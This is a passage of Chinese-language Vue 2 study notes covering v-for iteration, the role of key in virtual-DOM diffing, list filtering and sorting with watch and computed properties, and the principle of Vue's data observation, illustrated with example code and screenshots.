<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;ul&gt;<br>	&lt;li v-for&#x3D;&quot;(a,b,c) in persons&quot; :key&#x3D;&quot;a.id&quot;&gt;<br>        &lt;!--a,b in persons也可以，但是最好加()--&gt;<br>        &lt;!--(a,b) of persons也支持--&gt;<br>		&#123;&#123;a&#125;&#125;---------&#123;&#123;b&#125;&#125;---------&#123;&#123;c&#125;&#125;<br>	&lt;&#x2F;li&gt;<br>&lt;&#x2F;ul&gt;<br></code></pre></td></tr></table></figure>

效果：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902092933923.png" srcset="/img/loading.gif" lazyload alt="image-20210902092933923" style="zoom:80%;" />

这里，a是数组中的一项，b是数组索引值

#### 遍历对象

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;ul&gt;<br>            &lt;li v-for&#x3D;&quot;(value,key) in car&quot;&gt;<br>                &#123;&#123;value&#125;&#125; ---------- &#123;&#123;key&#125;&#125;<br>            &lt;&#x2F;li&gt;<br>        &lt;&#x2F;ul&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data:&#123;<br>            car:&#123;<br>                name: &#39;迈巴赫&#39;,<br>                price: &#39;800W&#39;,<br>                color: &#39;深蓝&#39;<br>            &#125;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902093739811.png" srcset="/img/loading.gif" lazyload alt="image-20210902093739811" style="zoom:80%;" />

#### 遍历字符串

不常用

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;ul&gt;<br>            &lt;li v-for&#x3D;&quot;(char,index) in str&quot;&gt;<br>                &#123;&#123;char&#125;&#125;----------&#123;&#123;index&#125;&#125;<br>            &lt;&#x2F;li&gt;<br>        &lt;&#x2F;ul&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            str: &#39;miketaylorjuly123.cn&#39;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902094009045.png" srcset="/img/loading.gif" lazyload alt="image-20210902094009045" style="zoom:80%;" />

#### 遍历指定次数

不常用

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;ul&gt;<br>            &lt;li v-for&#x3D;&quot;(number,index) in 6&quot;&gt;<br>                &#123;&#123;number&#125;&#125;-------&#123;&#123;index&#125;&#125;<br>            &lt;&#x2F;li&gt;<br>        &lt;&#x2F;ul&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902094412106.png" srcset="/img/loading.gif" lazyload alt="image-20210902094412106" style="zoom:80%;" />

#### key的作用与原理

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;ul&gt;<br>    &lt;li v-for&#x3D;&quot;(p,index) in persons&quot; :key&#x3D;&quot;p.id&quot;&gt;<br>    	&#123;&#123;p&#125;&#125;-------&#123;&#123;p.age&#125;&#125;<br>    &lt;&#x2F;li&gt;<br>&lt;&#x2F;ul&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902095144741.png" srcset="/img/loading.gif" lazyload alt="image-20210902095144741" style="zoom:80%;" />

vue将它转换为真实DOM时，将key征用，不在真实DOM上展示。下面验证：

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;ul&gt;<br>    &lt;li v-for&#x3D;&quot;(p,index) in persons&quot; :a&#x3D;&quot;p.id&quot;&gt;<br>    	&#123;&#123;p&#125;&#125;-------&#123;&#123;p.age&#125;&#125;<br>    &lt;&#x2F;li&gt;<br>&lt;&#x2F;ul&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902095509817.png" srcset="/img/loading.gif" lazyload alt="image-20210902095509817" style="zoom:80%;" />

##### 出错案例

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/29.gif" srcset="/img/loading.gif" lazyload alt="29" style="zoom:80%;" />

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>        &lt;!--准备一个容器--&gt;<br>        &lt;div id&#x3D;&quot;root&quot;&gt;<br>            &lt;ul&gt;<br>                &lt;li v-for&#x3D;&quot;(p,index) in persons&quot; :key&#x3D;&quot;p.id&quot;&gt;<br>                    &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125; &lt;input type&#x3D;&quot;text&quot;&gt;<br>                &lt;&#x2F;li&gt;<br>            &lt;&#x2F;ul&gt;<br>            &lt;button @click.once&#x3D;&quot;add&quot;&gt;添加人员&lt;&#x2F;button&gt;<br>        &lt;&#x2F;div&gt;<br>    &lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            persons: [&#123;<br>                id: &#39;001&#39;,<br>                name: &#39;张三&#39;,<br>                age: 18<br>            &#125;, &#123;<br>                id: &#39;002&#39;,<br>                name: &#39;李四&#39;,<br>                age: 19<br>            &#125;, &#123;<br>                id: &#39;003&#39;,<br>                name: &#39;王五&#39;,<br>                age: 20<br>            &#125;]<br>        &#125;,<br>        methods:&#123;<br>            add()&#123;<br>                const p &#x3D; &#123;<br>                    id:&quot;004&quot;,<br>                    name:&#39;张加林&#39;,<br>                    age:20<br>                &#125;;<br>                this.persons.unshift(p);<br>            &#125;<br>        &#125;,<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

改正：

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902100234674.png" srcset="/img/loading.gif" lazyload alt="image-20210902100234674" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/30.gif" srcset="/img/loading.gif" lazyload alt="30" style="zoom:80%;" />

| key   | T/F  |
| ----- | ---- |
| index | F    |
| none  | F    |
| id    | T    |

注：v-for遍历列表，没有写key，Vue默认将遍历时的索引值自动作为key。

##### 原理详解

对数据进行了如上破坏顺序的操作，那么key就可能引发上述问题。

对比的是虚拟DOM，输入框中输入的临时数据在真实DOM中，所以比对时只是考虑DOM节点是否一致。

对比结果为不同时，无法复用，将新的DOM重新转为真实DOM节点。

对比结果相同，DOM节点复用。

![image-20210902101929970](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902101929970.png)

![image-20210902102252854](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902102252854.png)

##### 面试题

react、vue中的key有什么作用？（key的内部原理）

* 虚拟DOM的作用：
  * key是虚拟DOM对象的标记，当数据发生变化，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
    * 旧虚拟DOM中未找到与新虚拟DOM相同的key：
      * 若虚拟DOM中内容没变，直接使用之前的真实DOM
      * 若虚拟DOM中的内容变了，则生成新的真实DOM，随后替换掉页面之前的真实DOM
    * 旧虚拟DOM中未找到与新虚拟DOM相同的key
      * 创建新的真实DOM，随后渲染到页面

用index作为key可能引发的问题：

* 如果对数据进行：逆序添加、逆序删除等破坏顺序等操作：
  * 会产生没有必要的真实DOM的更新==> 界面有问题

开发中如何选择key？

* 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值
* 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表展示，使用index作为key是没有任何问题的。

### 1.21 列表过滤

#### 效果

![31](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/31.gif)

#### 回顾JS数组知识

##### indexOf()

![image-20210902151923250](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902151923250.png)

* **注意：**
  * indexOf() 方法对大小写敏感！
  * 如果要检索的字符串值没有出现，则该方法返回 -1。
  * 当indexOf用于匹配空字符串时：<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902154649851.png" srcset="/img/loading.gif" lazyload alt="image-20210902154649851" style="zoom:80%;" />，即：任何字符串使用indexOf与空字符串进行匹配时，都会返回0，即匹配成功。

##### fliter()

![image-20210902151754774](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902151754774.png)

filter() 方法创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素。

* **注意：** 
  * filter() 不会对空数组进行检测。
  *  filter() 不会改变原始数组。

##### sort()

* sort() 方法用于对数组的元素进行排序。

* 排序顺序可以是字母或数字，并按升序或降序。
* 默认排序顺序为按字母升序。
* **注意：**当数字是按字母顺序排列时"40"将排在"5"前面。
* 使用数字排序，你必须通过一个函数作为参数来调用。
* 函数指定数字是按照升序还是降序排列。
* **注意：** 这种方法会改变原始数组！。

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902161945982.png" srcset="/img/loading.gif" lazyload alt="image-20210902161945982" style="zoom:80%;" />

#### 侦听属性实现

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;keywords&quot; placeholder&#x3D;&quot;输入关键词&quot;&gt;<br>        &lt;ul&gt;<br>            &lt;li v-for&#x3D;&quot;(p,index) in filpersons&quot; :key&#x3D;&quot;index&quot;&gt;<br>                &#123;&#123;p.name&#125;&#125;-----&#123;&#123;p.age&#125;&#125;---------&#123;&#123;p.gender&#125;&#125;<br>            &lt;&#x2F;li&gt;<br>        &lt;&#x2F;ul&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            keywords: &#39;&#39;,<br>            persons: [<br>                &#123; id: &#39;001&#39;, name: &#39;马冬梅&#39;, age: 20, gender: &#39;女&#39; &#125;,<br>                &#123; id: &#39;002&#39;, name: &#39;周冬雨&#39;, age: 28, gender: &#39;女&#39; &#125;,<br>                &#123; id: &#39;003&#39;, name: &#39;周杰伦&#39;, age: 40, gender: &#39;男&#39; &#125;,<br>                &#123; id: &#39;004&#39;, name: &#39;温兆伦&#39;, age: 50, gender: &#39;男&#39; &#125;],<br>            filpersons: []<br>        &#125;,<br>        watch: &#123;<br>            keywords: &#123;<br>                handler(newValue) &#123;<br>                    immediate: true;<br>                    this.filpersons &#x3D; this.persons.filter((p) &#x3D;&gt; &#123;<br>                        &#x2F;&#x2F; 函数体<br>                        &#x2F;&#x2F; return 过滤条件<br>                        console.log(newValue);<br>                        return p.name.indexOf(newValue) !&#x3D;&#x3D; -1;<br>                    &#125;);<br>            &#125;<br>            &#125;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

小技巧：如何在vscode中实现注释可折叠

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902155059438.png" srcset="/img/loading.gif" lazyload alt="image-20210902155059438" style="zoom: 67%;" />

#### 计算属性实现

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;keywords&quot; placeholder&#x3D;&quot;输入关键词&quot;&gt;<br>        &lt;ul&gt;<br>            &lt;li v-for&#x3D;&quot;(p,index) in filpersons&quot; :key&#x3D;&quot;index&quot;&gt;<br>                &#123;&#123;p.name&#125;&#125;-----&#123;&#123;p.age&#125;&#125;---------&#123;&#123;p.gender&#125;&#125;<br>            &lt;&#x2F;li&gt;<br>        &lt;&#x2F;ul&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            keywords: &#39;&#39;,<br>            persons: [<br>                &#123; id: &#39;001&#39;, name: &#39;马冬梅&#39;, age: 20, gender: &#39;女&#39; &#125;,<br>                &#123; id: &#39;002&#39;, name: &#39;周冬雨&#39;, age: 28, gender: &#39;女&#39; &#125;,<br>                &#123; id: &#39;003&#39;, name: &#39;周杰伦&#39;, age: 40, gender: &#39;男&#39; &#125;,<br>                &#123; id: &#39;004&#39;, name: &#39;温兆伦&#39;, age: 50, gender: &#39;男&#39; &#125;],<br>        &#125;,<br>        computed: &#123;<br>            filpersons() &#123;<br>                return this.persons.filter((p) &#x3D;&gt; &#123;<br>                    console.log(this.keywords);<br>                    return p.name.indexOf(this.keywords) !&#x3D;&#x3D; -1;<br>                &#125;);<br>            &#125;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

### 1.22 列表排序

案例效果：

![32](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/32.gif)

代码：

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;keywords&quot; placeholder&#x3D;&quot;输入关键词&quot;&gt;<br>        &lt;button @click&#x3D;&quot;sortType &#x3D; 2&quot;&gt;年龄升序&lt;&#x2F;button&gt;<br>        &lt;button @click&#x3D;&quot;sortType &#x3D; 1&quot;&gt;年龄降序&lt;&#x2F;button&gt;<br>        &lt;button @click&#x3D;&quot;sortType &#x3D; 0&quot;&gt;原顺序&lt;&#x2F;button&gt;<br>        &lt;ul&gt;<br>            &lt;li v-for&#x3D;&quot;(p,index) in filpersons&quot; :key&#x3D;&quot;p.id&quot;&gt;<br>                &#123;&#123;p.name&#125;&#125;-----&#123;&#123;p.age&#125;&#125;---------&#123;&#123;p.gender&#125;&#125;<br>            &lt;&#x2F;li&gt;<br>        &lt;&#x2F;ul&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            keywords: &#39;&#39;,<br>            sortType: &#39;&#39;, &#x2F;&#x2F; 0-原顺序，1-降序，2-升序<br>            persons: [<br>                &#123; id: &#39;001&#39;, name: &#39;马冬梅&#39;, age: 34, gender: &#39;女&#39; &#125;,<br>                &#123; id: &#39;002&#39;, name: &#39;周冬雨&#39;, age: 28, gender: &#39;女&#39; &#125;,<br>                &#123; id: &#39;003&#39;, name: &#39;周杰伦&#39;, age: 40, gender: &#39;男&#39; &#125;,<br>                &#123; id: &#39;004&#39;, name: &#39;温兆伦&#39;, age: 50, gender: &#39;男&#39; &#125;],<br>        &#125;,<br>        computed: &#123;<br>            filpersons() &#123;<br>                const arr &#x3D; this.persons.filter((p) &#x3D;&gt; &#123;<br>                    console.log(this.keywords);<br>                    return p.name.indexOf(this.keywords) !&#x3D;&#x3D; -1;<br>                &#125;);<br>                &#x2F;&#x2F; 判断是否需要排序<br>                if (this.sortType) &#123;<br>                    arr.sort((p1, p2) &#x3D;&gt; &#123;<br>                        &#x2F;&#x2F; 这里p1、p2是数组中的元素——对象<br>                        return this.sortType &#x3D;&#x3D;&#x3D; 1 ? p2.age - p1.age : p1.age - p2.age;<br>                    &#125;)<br>                &#125;<br>                return arr;<br>            &#125;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

注意：当sortType发生变化时由于filpersons是计算属性，filpersons也会跟着变化。

### 1.23 Vue监测数据改变原理

#### 更新时的一个问题

##### 没有问题

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id&#x3D;&quot;root&quot;&gt;<br>        &lt;button @click&#x3D;&quot;updateMei&quot;&gt;更新马冬梅&lt;&#x2F;button&gt;<br>        &lt;ul&gt;<br>            &lt;li v-for&#x3D;&quot;(p,index) in persons&quot; :key&#x3D;&quot;index&quot;&gt;<br>                &#123;&#123;p.name&#125;&#125;-----&#123;&#123;p.age&#125;&#125;---------&#123;&#123;p.gender&#125;&#125;<br>            &lt;&#x2F;li&gt;<br>        &lt;&#x2F;ul&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip &#x3D; false;&#x2F;&#x2F; 阻止VUE启动时生成生产提示。<br>    const vm &#x3D; new Vue(&#123;<br>        el: &#39;#root&#39;,<br>        data: &#123;<br>            persons: [<br>                &#123; id: &#39;001&#39;, name: &#39;马冬梅&#39;, age: 34, gender: &#39;女&#39; &#125;,<br>                &#123; id: &#39;002&#39;, name: &#39;周冬雨&#39;, age: 28, gender: &#39;女&#39; &#125;,<br>                &#123; id: &#39;003&#39;, name: &#39;周杰伦&#39;, age: 40, gender: &#39;男&#39; &#125;,<br>                &#123; id: &#39;004&#39;, name: &#39;温兆伦&#39;, age: 50, gender: &#39;男&#39; &#125;],<br>        &#125;,<br>        methods:&#123;<br>            updateMei()&#123;<br>                this.persons[0].name &#x3D; &#39;马老师&#39;; &#x2F;&#x2F; 奏效<br>                this.persons[0].age&#x3D;50; &#x2F;&#x2F; 奏效<br>                this.persons[0].gender &#x3D; &#39;男&#39;; &#x2F;&#x2F; 奏效<br>            &#125;<br>        &#125;<br>    &#125;)<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/33.gif" srcset="/img/loading.gif" lazyload alt="33" style="zoom: 67%;" />

##### 出现问题

直接使用对象赋值更改数据时，vue无法监测信息修改，但是信息已经更改了

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902165327793.png" srcset="/img/loading.gif" lazyload alt="image-20210902165327793" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/34.gif" srcset="/img/loading.gif" lazyload alt="34" style="zoom: 67%;" />

#### Vue监测对象数据原理

##### 回顾数据代理

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902215804912.png" srcset="/img/loading.gif" lazyload alt="image-20210902215804912" style="zoom:67%;" />



![image-20210902221205434](https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902221205434.png)

##### 模拟数据监测

###### 错误代码分析

回顾setInterval()

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902222011789.png" srcset="/img/loading.gif" lazyload alt="image-20210902222011789" style="zoom: 80%;" />

错误代码一

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>    <span class="hljs-keyword">let</span> data = &#123;<br>        name: <span class="hljs-string">&#x27;张加林&#x27;</span>,<br>        site: <span class="hljs-string">&#x27;miketaylorjuly123.cn&#x27;</span><br>    &#125;;<br><span class="hljs-keyword">let</span> tmp = <span class="hljs-string">&#x27;张加林&#x27;</span>;<br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-keyword">if</span>(data.name !== tmp)&#123;<br>        tmp = data.name<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;name被修改&#x27;</span>);<br>    &#125;<br>&#125;,<span class="hljs-number">100</span>)<br><span class="hljs-comment">// 定时器开死，不可能这样实现</span><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>

错误代码二

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902222607957.png" srcset="/img/loading.gif" lazyload alt="image-20210902222607957" style="zoom:80%;" />

此时的name，既无法读取，也无法修改，报错：栈溢出

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902223027051.png" srcset="/img/loading.gif" lazyload alt="image-20210902223027051" style="zoom:80%;" />

原因：读取或修改name时，出现了死循环。以读取为例，当读取name时，需要调用调用getter，而return时又需要读取name，不断迭代，产生了死循环，setter也同理。

###### 正确设计思路(重难点)

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210902223626431.png" srcset="/img/loading.gif" lazyload alt="image-20210902223626431" style="zoom:80%;" />

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>    <span class="hljs-keyword">let</span> data = &#123;<br>        name: <span class="hljs-string">&#x27;张加林&#x27;</span>,<br>        site: <span class="hljs-string">&#x27;miketaylorjuly123.cn&#x27;</span><br>    &#125;;<br>    <span class="hljs-comment">// 创建一个监视的实例对象，用于监视data中属性的变化</span><br>    <span class="hljs-keyword">const</span> obs = <span class="hljs-keyword">new</span> Observer(data);<br>    <span class="hljs-built_in">console</span>.log(obs);<br>    <span class="hljs-comment">// 准备一个vm实例对象</span><br>    <span class="hljs-keyword">let</span> vm = &#123;&#125;;<br>    vm._data = data = obs;<br><br>    <span class="hljs-comment">// 